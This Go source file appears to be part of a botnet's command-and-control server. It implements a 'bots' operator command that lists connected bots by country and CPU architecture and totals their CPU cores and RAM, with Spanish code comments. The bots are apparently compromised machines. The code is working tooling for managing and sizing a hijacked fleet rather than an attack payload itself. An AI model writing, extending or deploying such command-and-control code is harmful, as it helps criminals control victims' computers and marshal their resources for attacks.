package main

import (
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"
)

func handleBots(conn net.Conn, session *Session, command string) {
	args := strings.Fields(command)

	// Ayuda
	if len(args) > 1 && (args[1] == "help" || args[1] == "-h") {
		writeLine(conn, "Usage: bots [options]")
		writeLine(conn, "  (no args)  Show bot count and architecture breakdown")
		writeLine(conn, "  -c         Show total CPU cores")
		writeLine(conn, "  -m [unit]  Show total RAM (units: Mb, Gb, Tb, default Mb)")
		writeLine(conn, "  -c -m [unit] Show both CPU cores and RAM")
		writeLine(conn, "  -cl [N]    Show bots by country (top N, default all)")
		writeLine(conn, "Examples:")
		writeLine(conn, "  bots")
		writeLine(conn, "  bots -m Gb")
		writeLine(conn, "  bots -c -m Mb")
		writeLine(conn, "  bots -cl 10")
		return
	}

	// Copiar clientes bajo mutex
	mutex.Lock()
	clientsList := make([]*Client, 0, len(Clients))
	for _, c := range Clients {
		clientsList = append(clientsList, c)
	}
	mutex.Unlock()

	// --- Flag -cl (country list) ---
	if len(args) >= 2 && args[1] == "-cl" {
		limit := 0
		if len(args) >= 3 {
			if l, err := strconv.Atoi(args[2]); err == nil && l > 0 {
				limit = l
			}
		}

		countryMap := make(map[string]struct {
			Code  string
			Name  string
			Count int
		})
		for _, c := range clientsList {
			code := c.CountryCode
			if code == "" {
				code = "Unknown"
			}
			name := c.CountryName
			if name == "" {
				name = "Unknown"
			}
			entry := countryMap[code]
			entry.Code = code
			entry.Name = name
			entry.Count++
			countryMap[code] = entry
		}

		type pair struct {
			Code  string
			Name  string
			Count int
		}
		pairs := make([]pair, 0, len(countryMap))
		for _, v := range countryMap {
			pairs = append(pairs, pair{Code: v.Code, Name: v.Name, Count: v.Count})
		}
		sort.Slice(pairs, func(i, j int) bool {
			return pairs[i].Count > pairs[j].Count
		})
		if limit > 0 && limit < len(pairs) {
			pairs = pairs[:limit]
		}

		writeHeader(conn, "Bots by country:")
		for _, p := range pairs {
			value := p.Name + " (" + p.Code + ")"
			writeKeyValueColor(conn, value, ansiCommands, "["+strconv.Itoa(p.Count)+"]", ansiNumbers)
		}
		writeKeyValue(conn, "Total", "["+strconv.Itoa(len(clientsList))+"]")
		return
	}

	// --- Procesar flags -c y -m ---
	showCPU := false
	showRAM := false
	unit := "Mb"
	validFlags := true

	for i := 1; i < len(args); i++ {
		switch args[i] {
		case "-c":
			showCPU = true
		case "-m":
			showRAM = true
			if i+1 < len(args) {
				next := strings.ToLower(args[i+1])
				if next == "mb" || next == "gb" || next == "tb" {
					unit = next
					i++
				}
			}
		default:
			writeLine(conn, "Invalid flag: "+args[i])
			writeLine(conn, "Usage: bots [-c] [-m [Mb|Gb|Tb]] | -cl [N] | help")
			validFlags = false
		}
	}
	if !validFlags {
		return
	}

	// Sin flags: mostrar arquitecturas
	if !showCPU && !showRAM {
		archCount := make(map[string]int)
		for _, c := range clientsList {
			arch := c.Arch
			if arch == "" {
				arch = "unknown"
			}
			archCount[arch]++
		}
		writeHeader(conn, "Bots by architecture:")
		for arch, count := range archCount {
			writeKeyValue(conn, arch, "["+strconv.Itoa(count)+"]")
		}
		writeKeyValue(conn, "Total", "["+strconv.Itoa(len(clientsList))+"]")
		return
	}

	// Calcular totales
	var totalCores uint64
	var totalRAMMb uint64
	for _, c := range clientsList {
		totalCores += uint64(c.CPUCores)
		totalRAMMb += uint64(c.TotalRAM)
	}

	if showCPU {
		writeKeyValueColor(conn, "Total CPU Cores", ansiCommands, strconv.FormatUint(totalCores, 10), ansiNumbers)
	}
	if showRAM {
		var ramValue float64
		var ramUnit string
		switch unit {
		case "gb":
			ramValue = float64(totalRAMMb) / 1024.0
			ramUnit = "GB"
		case "tb":
			ramValue = float64(totalRAMMb) / (1024.0 * 1024.0)
			ramUnit = "TB"
		default:
			ramValue = float64(totalRAMMb)
			ramUnit = "MB"
		}
		var ramStr string
		if unit == "mb" {
			ramStr = strconv.FormatUint(totalRAMMb, 10)
		} else {
			ramStr = fmt.Sprintf("%.2f", ramValue)
		}
		writeKeyValueColor(conn, "Total RAM", ansiCommands, ramStr+" "+ramUnit, ansiNumbers)
	}
}
